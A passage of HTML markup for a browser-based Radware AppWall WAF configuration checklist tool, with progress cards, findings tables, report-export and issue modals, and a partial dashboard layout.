<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Radware AppWall WAF Configuration Checklist</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        radware: {
                            primary: '#0050B3',
                            secondary: '#0073E6',
                            accent: '#00A9FF',
                            light: '#D6E8FF',
                            dark: '#003366'
                        },
                        status: {
                            critical: '#DC2626',
                            high: '#F97316',
                            medium: '#FBBF24',
                            low: '#10B981'
                        }
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
        }
        
        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #F1F5F9;
            border-radius: 9999px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #CBD5E1;
            border-radius: 9999px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #94A3B8;
        }
        
        /* Task Status Controls */
        .status-controls {
            display: inline-flex;
            background-color: #E2E8F0;
            border-radius: 9999px;
            padding: 2px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        
        .status-btn {
            border: none;
            background: none;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.875rem;
            cursor: pointer;
            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
            border-radius: 9999px;
            margin: 0 1px;
        }
        
        .status-btn.active {
            background-color: #0073E6;
            color: white;
            transform: scale(1.05);
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        
        .status-btn.na.active {
            background-color: #64748B;
        }
        
        /* Progress Animation */
        @keyframes progressFill {
            from { width: 0; }
        }
        
        .progress-value {
            animation: progressFill 1.5s ease-out forwards;
        }
        
        /* Fade-in Animation */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .animate-fade-in {
            animation: fadeIn 0.3s ease-out forwards;
        }

        .code-block {
            background-color: #1e293b;
            color: #f8fafc;
            border-radius: 0.5rem;
            padding: 1rem;
            overflow-x: auto;
            font-family: 'Consolas', 'Monaco', 'Andale Mono', monospace;
            font-size: 0.875rem;
            line-height: 1.5;
            margin: 1rem 0;
        }
        .code-comment {
            color: #94a3b8;
        }
        .code-command {
            color: #38bdf8;
        }
        .code-value {
            color: #4ade80;
        }
        .code-param {
            color: #fb923c;
        }
        .code-highlight {
            color: #fb7185;
            font-weight: 600;
        }
    </style>
</head>
<body class="bg-gray-50 min-h-screen flex flex-col">
    
    <!-- Header -->
    <header class="bg-gradient-to-r from-radware-dark to-radware-primary text-white shadow-lg sticky top-0 z-50">
        <div class="container mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex flex-col sm:flex-row justify-between items-center py-4 gap-4">
                <div class="flex items-center gap-4">
                    <div class="bg-white/15 rounded-xl w-14 h-14 flex items-center justify-center shadow-lg">
                        <i class="fas fa-shield-alt text-3xl"></i>
                    </div>
                    <div>
                        <h1 class="text-2xl font-bold m-0 leading-tight">Radware AppWall</h1>
                        <span class="text-sm opacity-85">WAF Configuration Checklist</span>
                    </div>
                </div>
                <div class="flex gap-3 flex-wrap justify-center">
                    <button id="btn-projects" class="btn bg-white/15 hover:bg-white/25 text-white px-4 py-2 rounded-lg flex items-center gap-2 backdrop-blur transition">
                        <i class="fas fa-folder"></i>
                        <span>Projects</span>
                    </button>
                    <button id="btn-dashboard" class="btn bg-white/15 hover:bg-white/25 text-white px-4 py-2 rounded-lg flex items-center gap-2 backdrop-blur transition">
                        <i class="fas fa-chart-line"></i>
                        <span>Dashboard</span>
                    </button>
                    <button id="btn-export" class="btn bg-white/15 hover:bg-white/25 text-white px-4 py-2 rounded-lg flex items-center gap-2 backdrop-blur transition">
                        <i class="fas fa-file-export"></i>
                        <span>Export</span>
                    </button>
                    <button id="btn-import" class="btn bg-white/15 hover:bg-white/25 text-white px-4 py-2 rounded-lg flex items-center gap-2 backdrop-blur transition">
                        <i class="fas fa-file-import"></i>
                        <span>Import</span>
                    </button>
                </div>
            </div>
        </div>
    </header>

    <main class="container mx-auto px-4 sm:px-6 lg:px-8 py-6 flex-1">
        <!-- Project Info Section -->
        <section class="bg-white rounded-2xl p-6 sm:p-8 shadow-xl border border-gray-100 mb-8">
            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 pb-4 border-b border-gray-200">
                <h2 id="project-name" class="text-2xl font-bold bg-gradient-to-r from-radware-primary to-radware-secondary inline-block text-transparent bg-clip-text m-0">Radware AppWall Configuration</h2>
                <button id="btn-edit-project" class="btn bg-radware-secondary text-white px-4 py-2 rounded-lg flex items-center gap-2 shadow mt-3 sm:mt-0">
                    <i class="fas fa-edit"></i>
                    <span>Edit Details</span>
                </button>
            </div>
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                <div class="project-detail-item">
                    <dt class="text-sm font-semibold text-gray-500 uppercase tracking-wider flex items-center gap-2 mb-1">
                        <i class="fas fa-globe text-radware-accent"></i> Environment
                    </dt>
                    <dd id="project-target" class="text-gray-900 font-medium">production.example.com</dd>
                </div>
                <div class="project-detail-item">
                    <dt class="text-sm font-semibold text-gray-500 uppercase tracking-wider flex items-center gap-2 mb-1">
                        <i class="fas fa-calendar-alt text-radware-accent"></i> Start Date
                    </dt>
                    <dd id="project-date" class="text-gray-900 font-medium">5/15/2025</dd>
                </div>
                <div class="project-detail-item">
                    <dt class="text-sm font-semibold text-gray-500 uppercase tracking-wider flex items-center gap-2 mb-1">
                        <i class="fas fa-user-shield text-radware-accent"></i> Security Engineer
                    </dt>
                    <dd id="project-tester" class="text-gray-900 font-medium">WAF Administrator</dd>
                </div>
                <div class="project-detail-item">
                    <dt class="text-sm font-semibold text-gray-500 uppercase tracking-wider flex items-center gap-2 mb-1">
                        <i class="fas fa-history text-radware-accent"></i> Last Updated
                    </dt>
                    <dd id="project-updated" class="text-gray-900 font-medium">5/18/2025</dd>
                </div>
                <div class="project-detail-item col-span-1 md:col-span-2">
                    <dt class="text-sm font-semibold text-gray-500 uppercase tracking-wider flex items-center gap-2 mb-1">
                        <i class="fas fa-bullseye text-radware-accent"></i> Protected Applications
                    </dt>
                    <dd id="project-scope" class="text-gray-900 font-medium">E-commerce platform, Customer portal, Admin interface</dd>
                </div>
            </div>
        </section>

        <!-- Progress Section -->
        <section class="mb-12">
            <div class="flex items-end justify-between mb-6">
                <h2 class="text-2xl font-bold relative pb-3 inline-block">
                    Configuration Progress
                    <span class="absolute bottom-0 left-0 h-1 w-14 bg-gradient-to-r from-radware-primary to-radware-secondary rounded-full"></span>
                </h2>
            </div>
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                <div class="bg-white rounded-xl p-6 shadow-lg border border-gray-100 hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="flex items-center gap-3 text-lg font-semibold text-gray-800">
                            <div class="bg-radware-primary w-9 h-9 rounded-lg flex items-center justify-center shadow-md">
                                <i class="fas fa-tasks text-white"></i>
                            </div>
                            Overall Progress
                        </h3>
                        <span id="overall-progress" class="text-xl font-bold text-radware-primary">18%</span>
                    </div>
                    <div class="h-2 bg-gray-100 rounded-full mb-3 overflow-hidden">
                        <div id="overall-progress-bar" class="h-full bg-gradient-to-r from-radware-primary to-radware-secondary rounded-full progress-value" style="width: 18%"></div>
                    </div>
                    <div class="flex justify-between text-xs text-gray-500 font-medium">
                        <span>Completed Tasks</span>
                        <span>Overall Completion</span>
                    </div>
                </div>
                
                <div class="bg-white rounded-xl p-6 shadow-lg border border-gray-100 hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="flex items-center gap-3 text-lg font-semibold text-gray-800">
                            <div class="bg-status-critical w-9 h-9 rounded-lg flex items-center justify-center shadow-md">
                                <i class="fas fa-exclamation-triangle text-white"></i>
                            </div>
                            Critical Items
                        </h3>
                        <span id="critical-progress" class="text-xl font-bold text-status-critical">9/64</span>
                    </div>
                    <div class="h-2 bg-gray-100 rounded-full mb-3 overflow-hidden">
                        <div id="critical-progress-bar" class="h-full bg-gradient-to-r from-status-critical to-red-400 rounded-full progress-value" style="width: 14%"></div>
                    </div>
                    <div class="flex justify-between text-xs text-gray-500 font-medium">
                        <span>Critical Security Settings</span>
                        <span>High Priority</span>
                    </div>
                </div>
                
                <div class="bg-white rounded-xl p-6 shadow-lg border border-gray-100 hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="flex items-center gap-3 text-lg font-semibold text-gray-800">
                            <div class="bg-status-high w-9 h-9 rounded-lg flex items-center justify-center shadow-md">
                                <i class="fas fa-arrow-circle-up text-white"></i>
                            </div>
                            High Priority
                        </h3>
                        <span id="high-progress" class="text-xl font-bold text-status-high">12/78</span>
                    </div>
                    <div class="h-2 bg-gray-100 rounded-full mb-3 overflow-hidden">
                        <div id="high-progress-bar" class="h-full bg-gradient-to-r from-status-high to-amber-400 rounded-full progress-value" style="width: 15%"></div>
                    </div>
                    <div class="flex justify-between text-xs text-gray-500 font-medium">
                        <span>High-Risk Vulnerabilities</span>
                        <span>Important Settings</span>
                    </div>
                </div>
                
                <div class="bg-white rounded-xl p-6 shadow-lg border border-gray-100 hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="flex items-center gap-3 text-lg font-semibold text-gray-800">
                            <div class="bg-status-medium w-9 h-9 rounded-lg flex items-center justify-center shadow-md">
                                <i class="fas fa-arrow-circle-right text-gray-800"></i>
                            </div>
                            Medium Priority
                        </h3>
                        <span id="medium-progress" class="text-xl font-bold text-status-medium">15/38</span>
                    </div>
                    <div class="h-2 bg-gray-100 rounded-full mb-3 overflow-hidden">
                        <div id="medium-progress-bar" class="h-full bg-gradient-to-r from-status-medium to-yellow-200 rounded-full progress-value" style="width: 39%"></div>
                    </div>
                    <div class="flex justify-between text-xs text-gray-500 font-medium">
                        <span>Standard Configuration</span>
                        <span>Medium Risk</span>
                    </div>
                </div>
            </div>
        </section>

        <!-- Categories Section -->
        <section id="categories-section" class="mb-12">
            <div class="flex items-end justify-between mb-6">
                <h2 class="text-2xl font-bold relative pb-3 inline-block">
                    WAF Configuration Categories
                    <span class="absolute bottom-0 left-0 h-1 w-14 bg-gradient-to-r from-radware-primary to-radware-secondary rounded-full"></span>
                </h2>
            </div>
            <div id="categories-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                <!-- Categories will be dynamically inserted here -->
            </div>
        </section>

        <!-- Category Details Section (Hidden by default) -->
        <section id="category-details" class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden mb-8 hidden">
            <div class="bg-gradient-to-r from-radware-dark to-radware-primary p-8 text-white relative overflow-hidden">
                <a href="#" id="btn-back" class="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-white/15 backdrop-blur transition hover:bg-white/25 mb-5 text-sm font-medium">
                    <i class="fas fa-arrow-left"></i>
                    <span>Back to categories</span>
                </a>
                <h2 id="details-title" class="text-3xl font-bold mb-2 text-white">1. Initial Deployment & Architecture</h2>
                <p id="details-subtitle" class="text-white/90 text-lg max-w-4xl">Base configuration setup, deployment modes, and network architecture</p>
            </div>
            <div class="p-8">
                <div class="border-b border-gray-200 flex gap-2 mb-8 overflow-x-auto">
                    <a href="#" class="tab-link px-5 py-3 font-medium text-gray-600 hover:text-radware-primary relative active" data-tab="checklist">Checklist</a>
                    <a href="#" class="tab-link px-5 py-3 font-medium text-gray-600 hover:text-radware-primary relative" data-tab="techniques">Techniques</a>
                    <a href="#" class="tab-link px-5 py-3 font-medium text-gray-600 hover:text-radware-primary relative" data-tab="tools">Tools</a>
                    <a href="#" class="tab-link px-5 py-3 font-medium text-gray-600 hover:text-radware-primary relative" data-tab="notes">Notes</a>
                </div>
                
                <div id="tab-contents">
                    <div id="checklist-tab" class="tab-content">
                        <!-- Checklist items will be dynamically inserted here -->
                    </div>
                    
                    <div id="techniques-tab" class="tab-content hidden">
                        <!-- Techniques will be dynamically inserted here -->
                    </div>
                    
                    <div id="tools-tab" class="tab-content hidden">
                        <!-- Tools will be dynamically inserted here -->
                    </div>
                    
                    <div id="notes-tab" class="tab-content hidden">
                        <div class="mb-6">
                            <label for="category-notes" class="block text-gray-700 font-medium mb-3">Configuration Notes for this Category</label>
                            <textarea id="category-notes" class="w-full min-h-[260px] p-4 border border-gray-300 rounded-lg resize-y font-sans text-gray-700 focus:outline-none focus:ring-2 focus:ring-radware-accent focus:border-transparent transition" placeholder="Add specific findings, observations, or commands used..."></textarea>
                            <button id="btn-save-notes" class="mt-5 bg-gradient-to-r from-radware-primary to-radware-secondary text-white px-4 py-2 rounded-lg flex items-center gap-2 shadow-md hover:shadow-lg transition">
                                <i class="fas fa-save"></i>
                                <span>Save Notes</span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Findings Section -->
        <section class="mb-12">
            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
                <h2 class="text-2xl font-bold relative pb-3 inline-block">
                    Configuration Issues
                    <span class="absolute bottom-0 left-0 h-1 w-14 bg-gradient-to-r from-radware-primary to-radware-secondary rounded-full"></span>
                </h2>
                <div class="flex gap-3">
                    <button id="btn-add-finding" class="bg-status-low hover:bg-green-600 text-white px-4 py-2 rounded-lg flex items-center gap-2 shadow-md hover:shadow-lg transition">
                        <i class="fas fa-plus"></i>
                        <span>Add Issue</span>
                    </button>
                    <button id="btn-generate-report" class="bg-radware-primary hover:bg-radware-secondary text-white px-4 py-2 rounded-lg flex items-center gap-2 shadow-md hover:shadow-lg transition">
                        <i class="fas fa-file-alt"></i>
                        <span>Generate Report</span>
                    </button>
                </div>
            </div>
            <div class="bg-white rounded-xl shadow-xl border border-gray-100 overflow-hidden">
                <div class="overflow-x-auto">
                    <table class="w-full text-left">
                        <thead>
                            <tr>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent">Category</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent text-center">High</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent text-center">Medium</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent text-center">Low</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent text-center">Info</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent text-center">Total</th>
                                <th class="px-5 py-4 bg-gray-100 text-xs font-semibold text-gray-700 uppercase tracking-wider border-b-2 border-radware-accent">Actions</th>
                            </tr>
                        </thead>
                        <tbody id="findings-table-body">
                            <!-- Finding data will be dynamically inserted here -->
                        </tbody>
                    </table>
                </div>
            </div>
        </section>
    </main>

    <!-- Footer -->
    <footer class="bg-gradient-to-r from-radware-dark to-radware-primary text-white py-12 mt-6">
        <div class="container mx-auto px-4 sm:px-6 lg:px-8">
            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
                <div>
                    <h3 class="text-xl font-bold mb-4 relative inline-block pb-3">
                        Radware AppWall Configuration Checklist
                        <span class="absolute bottom-0 left-0 w-10 h-1 bg-radware-accent"></span>
                    </h3>
                    <p class="text-white/90 text-sm">A comprehensive framework for configuring and validating Radware AppWall WAF deployments based on industry best practices and Radware's recommendations.</p>
                </div>
                <div>
                    <h4 class="text-lg font-bold mb-4 relative inline-block pb-2">
                        Resources
                        <span class="absolute bottom-0 left-0 w-8 h-1 bg-radware-accent"></span>
                    </h4>
                    <ul class="space-y-3">
                        <li><a href="https://www.radware.com/products/appwall/" target="_blank" class="text-white/90 hover:text-white flex items-center gap-2 pl-4 relative text-sm before:content-[''] before:absolute before:left-0 before:top-1/2 before:-translate-y-1/2 before:w-2 before:h-2 before:bg-radware-accent before:rounded-full hover:translate-x-1 transition-transform"><i class="fas fa-external-link-alt opacity-80"></i> Radware AppWall Documentation</a></li>
                        <li><a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" target="_blank" class="text-white/90 hover:text-white flex items-center gap-2 pl-4 relative text-sm before:content-[''] before:absolute before:left-0 before:top-1/2 before:-translate-y-1/2 before:w-2 before:h-2 before:bg-radware-accent before:rounded-full hover:translate-x-1 transition-transform"><i class="fas fa-external-link-alt opacity-80"></i> OWASP Top 10</a></li>
                        <li><a href="https://www.pci-dss.org" target="_blank" class="text-white/90 hover:text-white flex items-center gap-2 pl-4 relative text-sm before:content-[''] before:absolute before:left-0 before:top-1/2 before:-translate-y-1/2 before:w-2 before:h-2 before:bg-radware-accent before:rounded-full hover:translate-x-1 transition-transform"><i class="fas fa-external-link-alt opacity-80"></i> PCI DSS Requirements</a></li>
                    </ul>
                </div>
                <div>
                    <h4 class="text-lg font-bold mb-4 relative inline-block pb-2">
                        About This Tool
                        <span class="absolute bottom-0 left-0 w-8 h-1 bg-radware-accent"></span>
                    </h4>
                    <p class="text-white/90 text-sm mb-3">Data is saved locally in your browser via LocalStorage. No data is sent externally. Use Export/Import for backup or transfer between devices.</p>
                    <p class="text-white/90 text-sm">This tool is developed for professional WAF configuration and should be used by security teams with Radware AppWall experience.</p>
                </div>
            </div>
            <div class="border-t border-white/10 mt-8 pt-8 text-center text-sm text-white/70">
                <p>Â© 2025 Radware AppWall WAF Configuration Checklist | For professional security configuration only</p>
            </div>
        </div>
    </footer>

    <!-- Modals -->
    <!-- Finding Modal -->
    <div id="finding-modal" class="fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm">
        <div class="bg-white rounded-xl shadow-2xl max-w-lg w-full max-h-[90vh] overflow-y-auto">
            <div class="border-b border-gray-200 px-6 py-4 flex justify-between items-center">
                <h3 id="finding-modal-title" class="text-xl font-semibold text-gray-900">Add Configuration Issue</h3>
                <button class="modal-close text-gray-500 hover:text-gray-700">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="p-6">
                <div class="space-y-4">
                    <div>
                        <label for="finding-category" class="block text-sm font-medium text-gray-700 mb-1">Category</label>
                        <select id="finding-category" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <!-- Options will be dynamically inserted here -->
                        </select>
                    </div>
                    
                    <div>
                        <label for="finding-title" class="block text-sm font-medium text-gray-700 mb-1">Issue Title</label>
                        <input type="text" id="finding-title" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition" placeholder="Brief description of the issue">
                    </div>
                    
                    <div>
                        <label for="finding-severity" class="block text-sm font-medium text-gray-700 mb-1">Severity</label>
                        <select id="finding-severity" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <option value="high">High</option>
                            <option value="medium">Medium</option>
                            <option value="low">Low</option>
                            <option value="info">Informational</option>
                        </select>
                    </div>
                    
                    <div>
                        <label for="finding-description" class="block text-sm font-medium text-gray-700 mb-1">Description</label>
                        <textarea id="finding-description" rows="4" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition" placeholder="Detailed description of the issue"></textarea>
                    </div>
                    
                    <div>
                        <label for="finding-remediation" class="block text-sm font-medium text-gray-700 mb-1">Recommended Remediation</label>
                        <textarea id="finding-remediation" rows="4" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition" placeholder="Steps to remediate the issue"></textarea>
                    </div>
                    
                    <div>
                        <label for="finding-config" class="block text-sm font-medium text-gray-700 mb-1">Configuration Commands</label>
                        <textarea id="finding-config" rows="4" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition font-mono text-sm" placeholder="AppWall configuration commands to address the issue"></textarea>
                    </div>
                </div>
            </div>
            <div class="border-t border-gray-200 px-6 py-4 flex justify-end gap-3">
                <button class="modal-close px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition">Cancel</button>
                <button id="btn-save-finding" class="px-4 py-2 bg-gradient-to-r from-radware-primary to-radware-secondary text-white rounded-lg hover:shadow-md transition">Save Issue</button>
            </div>
        </div>
    </div>
    
    <!-- View Finding Modal -->
    <div id="view-finding-modal" class="fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm">
        <div class="bg-white rounded-xl shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
            <div class="border-b border-gray-200 px-6 py-4 flex justify-between items-center">
                <h3 id="view-finding-title" class="text-xl font-semibold text-gray-900">Configuration Issue Details</h3>
                <button class="modal-close text-gray-500 hover:text-gray-700">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="p-6">
                <div class="space-y-6" id="view-finding-content">
                    <!-- Finding content will be inserted here dynamically -->
                </div>
            </div>
            <div class="border-t border-gray-200 px-6 py-4 flex justify-between gap-3">
                <div>
                    <button id="btn-edit-finding" class="px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition flex items-center gap-2">
                        <i class="fas fa-edit"></i> Edit
                    </button>
                </div>
                <div class="flex gap-3">
                    <button id="btn-delete-finding" class="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 transition flex items-center gap-2">
                        <i class="fas fa-trash"></i> Delete
                    </button>
                    <button class="modal-close px-4 py-2 bg-gray-700 text-white rounded-lg hover:bg-gray-800 transition">Close</button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Confirm Delete Modal -->
    <div id="confirm-modal" class="fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm">
        <div class="bg-white rounded-xl shadow-2xl max-w-md w-full">
            <div class="border-b border-gray-200 px-6 py-4">
                <h3 class="text-xl font-semibold text-gray-900">Confirm Action</h3>
            </div>
            <div class="p-6">
                <p id="confirm-message" class="text-gray-700">Are you sure you want to delete this configuration issue? This action cannot be undone.</p>
            </div>
            <div class="border-t border-gray-200 px-6 py-4 flex justify-end gap-3">
                <button class="modal-close px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition">Cancel</button>
                <button id="confirm-yes" class="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 transition">Yes, Delete</button>
            </div>
        </div>
    </div>

    <!-- Export Report Modal -->
    <div id="export-modal" class="fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm">
        <div class="bg-white rounded-xl shadow-2xl max-w-lg w-full">
            <div class="border-b border-gray-200 px-6 py-4 flex justify-between items-center">
                <h3 class="text-xl font-semibold text-gray-900">Export Report</h3>
                <button class="modal-close text-gray-500 hover:text-gray-700">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="p-6">
                <div class="space-y-4">
                    <div>
                        <label for="export-format" class="block text-sm font-medium text-gray-700 mb-1">Report Format</label>
                        <select id="export-format" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <option value="pdf">PDF Document</option>
                            <option value="html">HTML Report</option>
                            <option value="json">JSON Configuration</option>
                        </select>
                    </div>
                    
                    <div>
                        <label for="export-detail" class="block text-sm font-medium text-gray-700 mb-1">Detail Level</label>
                        <select id="export-detail" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <option value="summary">Summary (Issues Only)</option>
                            <option value="detailed">Detailed (Full Configuration Status)</option>
                            <option value="complete">Complete (All Settings and Commands)</option>
                        </select>
                    </div>
                    
                    <div class="flex items-start gap-2">
                        <input type="checkbox" id="export-include-notes" class="mt-1">
                        <label for="export-include-notes" class="text-sm text-gray-700">Include configuration notes in the report</label>
                    </div>
                </div>
            </div>
            <div class="border-t border-gray-200 px-6 py-4 flex justify-end gap-3">
                <button class="modal-close px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition">Cancel</button>
                <button id="btn-do-export" class="px-4 py-2 bg-gradient-to-r from-radware-primary to-radware-secondary text-white rounded-lg hover:shadow-md transition">Export Report</button>
            </div>
        </div>
    </div>

    <!-- Toast Notifications -->
    <div id="toast-container" class="fixed bottom-4 right-4 z-50"></div>









































































<!-- Dashboard Modal -->
<div id="dashboard-modal" class="fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm">
    <div class="bg-white rounded-xl shadow-2xl w-11/12 max-w-7xl max-h-[90vh] overflow-hidden flex flex-col">
        <div class="border-b border-gray-200 px-6 py-4 flex justify-between items-center bg-gradient-to-r from-radware-dark to-radware-primary text-white">
            <h3 class="text-xl font-semibold">AppWall WAF Configuration Dashboard</h3>
            <button class="modal-close text-white/80 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        
        <div class="flex-1 overflow-y-auto p-6">
            <!-- Overview Cards Row -->
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
                <div class="bg-white rounded-xl shadow-lg border border-gray-200 p-5 flex flex-col">
                    <div class="text-sm font-medium text-gray-500 mb-1">Overall Completion</div>
                    <div class="flex items-end justify-between">
                        <div class="text-3xl font-bold text-radware-primary" id="dash-overall-completion">0%</div>
                        <div id="dash-overall-trend" class="text-green-500 flex items-center text-sm">
                            <i class="fas fa-arrow-up mr-1"></i> 5%
                        </div>
                    </div>
                    <div class="mt-4 h-2 bg-gray-100 rounded-full overflow-hidden">
                        <div id="dash-overall-bar" class="h-full bg-gradient-to-r from-radware-primary to-radware-secondary rounded-full" style="width: 0%"></div>
                    </div>
                </div>
                
                <div class="bg-white rounded-xl shadow-lg border border-gray-200 p-5 flex flex-col">
                    <div class="text-sm font-medium text-gray-500 mb-1">Critical Items</div>
                    <div class="flex items-end justify-between">
                        <div class="text-3xl font-bold text-status-critical" id="dash-critical-completion">0%</div>
                        <div id="dash-critical-count" class="text-gray-500 text-sm font-medium">0/0 items</div>
                    </div>
                    <div class="mt-4 h-2 bg-gray-100 rounded-full overflow-hidden">
                        <div id="dash-critical-bar" class="h-full bg-gradient-to-r from-status-critical to-red-400 rounded-full" style="width: 0%"></div>
                    </div>
                </div>
                
                <div class="bg-white rounded-xl shadow-lg border border-gray-200 p-5 flex flex-col">
                    <div class="text-sm font-medium text-gray-500 mb-1">Configuration Issues</div>
                    <div class="flex items-end justify-between">
                        <div class="text-3xl font-bold text-gray-800" id="dash-issues-count">0</div>
                        <div id="dash-severity-distribution" class="text-sm flex gap-2">
                            <span class="flex items-center" title="High"><i class="fas fa-circle text-status-critical text-xs"></i> <span id="dash-high-count">0</span></span>
                            <span class="flex items-center" title="Medium"><i class="fas fa-circle text-status-high text-xs"></i> <span id="dash-medium-count">0</span></span>
                            <span class="flex items-center" title="Low"><i class="fas fa-circle text-status-medium text-xs"></i> <span id="dash-low-count">0</span></span>
                        </div>
                    </div>
                    <div class="mt-4 h-2 bg-gray-100 rounded-full overflow-hidden">
                        <div class="h-full flex">
                            <div id="dash-high-bar" class="h-full bg-status-critical" style="width: 0%"></div>
                            <div id="dash-medium-bar" class="h-full bg-status-high" style="width: 0%"></div>
                            <div id="dash-low-bar" class="h-full bg-status-medium" style="width: 0%"></div>
                        </div>
                    </div>
                </div>
                
                <div class="bg-white rounded-xl shadow-lg border border-gray-200 p-5 flex flex-col">
                    <div class="text-sm font-medium text-gray-500 mb-1">Last Updated</div>
                    <div class="flex items-end justify-between">
                        <div class="text-xl font-semibold text-gray-800" id="dash-last-updated">N/A</div>
                        <div id="dash-days-ago" class="text-gray-500 text-sm">Never</div>
                    </div>
                    <div class="mt-2 text-sm text-gray-500" id="dash-last-updated-item">
                        No recent activity
                    </div>
                </div>
            </div>
            
            <!-- Charts Row -->
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
                <!-- Category Completion Chart -->
                <div class="bg-white rounded-xl shadow-lg border border-gray-200 p-5">
                    <h4 class="font-semibold text-gray-800 mb-4">Category Completion</h4>
                    <div class="h-80">
                        <canvas id="categoryChart"></canvas>
                    </div>
                </div>
                
                <!-- Priority Completion Chart -->
                <div class="bg-white rounded-xl shadow-lg border border-gray-200 p-5">
                    <h4 class="font-semibold text-gray-800 mb-4">Completion by Priority</h4>
                    <div class="h-80">
                        <canvas id="priorityChart"></canvas>
                    </div>
                </div>
            </div>
            
            <!-- Bottom Sections -->
            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
                <!-- Top Incomplete Critical Items -->
                <div class="bg-white rounded-xl shadow-lg border border-gray-200 p-5 lg:col-span-2">
                    <h4 class="font-semibold text-gray-800 mb-4">Critical Items Requiring Attention</h4>
                    <div class="overflow-y-auto max-h-64" id="dash-critical-items">
                        <div class="text-center py-8 text-gray-500">
                            <i class="fas fa-check-circle text-3xl mb-2"></i>
                            <p>All critical items have been addressed!</p>
                        </div>
                    </div>
                </div>
                
                <!-- Top Issues -->
